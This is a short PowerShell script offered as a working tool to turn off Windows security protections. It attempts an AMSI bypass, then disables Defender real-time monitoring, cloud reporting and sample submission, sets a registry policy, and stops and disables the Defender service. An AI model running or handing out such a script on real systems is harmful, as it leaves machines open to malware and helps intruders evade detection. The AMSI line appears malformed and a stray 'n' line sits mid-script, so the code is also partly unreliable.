$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed'
If (-Not $s) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed' = $true}

Set-MpPreference -DisableRealtimeMonitoring $true
n
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

Write-Host "Windows Defender has been disabled."
